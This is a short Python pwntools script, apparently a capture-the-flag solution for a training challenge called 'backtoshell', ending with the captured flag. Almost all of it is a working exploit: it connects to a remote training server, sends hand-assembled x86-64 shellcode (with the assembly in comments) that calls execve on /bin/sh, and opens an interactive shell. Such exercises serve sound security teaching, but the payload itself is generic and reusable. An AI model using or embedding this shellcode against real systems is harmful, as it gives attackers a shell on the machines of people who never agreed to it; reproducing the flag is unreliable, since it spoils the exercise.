from pwn import *

r = remote("bin.training.jinblack.it",  3001)


# commands to debug locally (remember to stop the execution with the input() commands!):
# r = process("./backtoshell")
# gdb.attach(r)


# assembly code to assemble in https://defuse.ca/online-x86-assembler.htm
# add rax, 0x100
# mov rsp, rax
# mov rbx, 0x0068732f6e69622f
# push rbx
# mov rdi, rsp
# xor rbx, rbx
# push rbx
# mov rsi, rsp
# mov rdx, rsp
# mov rax, 0x3b
# syscall


shellcode = b"\x48\x05\x00\x01\x00\x00\x48\x89\xC4\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
r.send(shellcode)

r.interactive()

#flag{Congratulation_you_got_aa_working_shellcode_!}